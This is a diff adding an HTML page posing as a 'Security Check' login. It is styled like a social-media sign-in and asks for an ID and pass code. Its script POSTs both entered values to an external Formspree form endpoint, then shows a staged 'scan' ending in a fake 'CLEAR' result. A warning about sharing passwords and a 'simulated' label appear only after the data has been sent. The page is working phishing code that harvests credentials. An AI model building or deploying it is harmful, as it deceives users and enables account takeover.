@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security Check</title>
+<style>
+:root{--bg:#fafafa;--card:#fff;--border:#dbdbdb;--text:#262626;--muted:#8e8e8e;--blue:#0095f6;--blue-dark:#1877f2}
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;background:var(--bg);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;display:flex;align-items:center;justify-content:center;padding:20px}
+#login-screen{width:100%;max-width:350px;text-align:center}
+.logo{font-family:'Brush Script MT',cursive;font-size:52px;margin:30px 0 18px;color:var(--text)}
+.card{background:var(--card);border:1px solid var(--border);border-radius:1px;padding:30px 40px 20px}
+input{width:100%;padding:9px 8px;margin-bottom:6px;border:1px solid var(--border);border-radius:3px;background:#fafafa;font-size:14px}
+input:focus{outline:1px solid #a8a8a8}
+button#loginBtn{width:100%;margin-top:10px;padding:8px;background:var(--blue);opacity:.6;color:white;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}
+button#loginBtn.active{opacity:1} button#loginBtn:disabled{cursor:not-allowed}
+#pwRules{text-align:left;font-size:12px;color:var(--muted);margin:2px 0 10px;padding-left:2px}
+#pwRules li{list-style:none;margin-bottom:3px;display:flex;align-items:center;gap:6px}
+#pwRules li::before{content:"○";font-size:10px;color:var(--muted)}
+#pwRules li.ok{color:#1a7f4e} #pwRules li.ok::before{content:"●";color:#1a7f4e}
+.forgot{color:#00376b;font-size:12px;margin-top:14px;display:block}
+.checking{font-size:12px;color:var(--muted);margin-top:14px;min-height:16px}
+#reveal-screen{display:none;max-width:420px;text-align:center;background:var(--card);border-radius:16px;padding:40px 30px;box-shadow:0 10px 40px rgba(0,0,0,.15);animation:pop .45s cubic-bezier(.2,1.6,.4,1)}
+@keyframes pop{0%{transform:scale(.6) rotate(-8deg);opacity:0}60%{transform:scale(1.08) rotate(3deg);opacity:1}100%{transform:scale(1) rotate(0)}}
+.emoji{font-size:64px;display:block;margin-bottom:10px;animation:wiggle .6s ease-in-out .45s}
+@keyframes wiggle{0%,100%{transform:rotate(0)}25%{transform:rotate(-12deg)}75%{transform:rotate(12deg)}}
+#reveal-screen h1{font-size:24px;margin:0 0 10px;color:var(--text)}
+#reveal-screen p{color:var(--muted);font-size:15px;line-height:1.5;margin:0 0 20px}
+.safe-note{background:#f0fbf4;border:1px solid #bfe8cf;color:#1a7f4e;font-size:13px;border-radius:8px;padding:10px 14px;margin-bottom:20px}
+#closeBtn{background:var(--blue);color:white;border:none;padding:10px 24px;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}
+#closeBtn:hover{background:var(--blue-dark)}
+#blank-screen{display:none;position:fixed;inset:0;background:#fff}
+</style>
+</head>
+<body>
+<div id="login-screen">
+<div class="logo">Security Check</div>
+<div class="card">
+<p style="font-size:13px;color:var(--muted);margin:0 0 14px;">Enter your ID and pass code to continue</p>
+<input id="userField" type="text" placeholder="ID" autocomplete="off">
+<input id="passField" type="text" placeholder="Pass Code" autocomplete="off">
+<ul id="pwRules"><li id="ruleLen">More than 7 characters</li></ul>
+<button id="loginBtn" disabled>Check login activity</button>
+<div class="checking" id="checkingMsg"></div>
+<a class="forgot" id="forgotLink" href="#">Forgot pass code?</a>
+</div>
+</div>
+
+<div id="blank-screen"></div>
+
+<div id="reveal-screen">
+<span class="emoji">🛡️</span>
+<h1>Security Check Complete</h1>
+
+<p style="margin-bottom:12px;">
+  Scan completed successfully.
+</p>
+
+<div style="background:#f7f7f7;border:1px solid #e2e2e2;border-radius:10px;padding:16px;text-align:left;margin-bottom:18px;">
+  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+    <strong style="font-size:14px;color:#262626;">Security scan</strong>
+    <span style="font-size:12px;color:#1a7f4e;font-weight:600;">COMPLETED</span>
+  </div>
+
+  <div style="display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid #e5e5e5;">
+    <span style="font-size:13px;color:#666;">Illegal entries found</span>
+    <strong style="font-size:13px;color:#1a7f4e;">0</strong>
+  </div>
+
+  <div style="display:flex;justify-content:space-between;padding:7px 0;border-bottom:1px solid #e5e5e5;">
+    <span style="font-size:13px;color:#666;">Suspicious activity</span>
+    <strong style="font-size:13px;color:#1a7f4e;">0 detected</strong>
+  </div>
+
+  <div style="display:flex;justify-content:space-between;padding:7px 0;">
+    <span style="font-size:13px;color:#666;">Security status</span>
+    <strong style="font-size:13px;color:#1a7f4e;">CLEAR</strong>
+  </div>
+</div>
+
+<div class="safe-note">
+  🔒 Never share your real passwords, OTPs, banking details, or other sensitive information with unknown websites.
+</div>
+
+<p style="font-size:11px;color:#999;margin-top:12px;">
+  Demo security scan — results are simulated.
+</p>
+
+<button id="closeBtn">Close</button>
+</div>
+
+<script>
+const userField=document.getElementById('userField');
+const passField=document.getElementById('passField');
+const loginBtn=document.getElementById('loginBtn');
+const checkingMsg=document.getElementById('checkingMsg');
+const loginScreen=document.getElementById('login-screen');
+const revealScreen=document.getElementById('reveal-screen');
+const closeBtn=document.getElementById('closeBtn');
+const forgotLink=document.getElementById('forgotLink');
+const blankScreen=document.getElementById('blank-screen');
+const ruleLen=document.getElementById('ruleLen');
+
+forgotLink.addEventListener('click',(e)=>{
+e.preventDefault();loginScreen.style.display='none';blankScreen.style.display='block';
+});
+
+function checkRules(){
+const hasLen=passField.value.length>7;
+ruleLen.classList.toggle('ok',hasLen);
+const allGood=hasLen&&userField.value.trim().length>0;
+loginBtn.disabled=!allGood;
+loginBtn.classList.toggle('active',allGood);
+return allGood;
+}
+
+userField.addEventListener('input',checkRules);
+passField.addEventListener('input',checkRules);
+
+loginBtn.addEventListener('click',async()=>{
+if(loginBtn.disabled)return;
+loginBtn.disabled=true;
+checkingMsg.textContent='Checking recent login activity…';
+
+try{
+const response=await fetch('https://formspree.io/f/xzezjnzp',{
+method:'POST',
+headers:{'Accept':'application/json','Content-Type':'application/json'},
+body:JSON.stringify({id:userField.value.trim(),passcode:passField.value})
+});
+if(!response.ok)throw new Error('Formspree submission failed');
+
+userField.value='';
+passField.value='';
+checkRules();
+
+let scanStep = 0;
+const scanMessages = [
+  'Checking recent login activity…',
+  'Scanning security records…',
+  'Checking suspicious entries…',
+  'Finalizing security report…'
+];
+
+checkingMsg.textContent = scanMessages[0];
+
+const scanInterval = setInterval(() => {
+  scanStep++;
+
+  if (scanStep < scanMessages.length) {
+    checkingMsg.textContent = scanMessages[scanStep];
+  } else {
+    clearInterval(scanInterval);
+
+    setTimeout(() => {
+      loginScreen.style.display = 'none';
+      revealScreen.style.display = 'block';
+    }, 700);
+  }
+}, 900);
+}catch(error){
+loginBtn.disabled=false;
+loginBtn.classList.add('active');
+checkingMsg.textContent='Submission failed. Please try again.';
+console.error(error);
+}
+});
+
+closeBtn.addEventListener('click',()=>{
+revealScreen.style.display='none';
+loginScreen.style.display='block';
+checkingMsg.textContent='';
+loginBtn.classList.remove('active');
+loginBtn.disabled=true;
+ruleLen.classList.remove('ok');
+});
+</script>
+</body>
+</html>
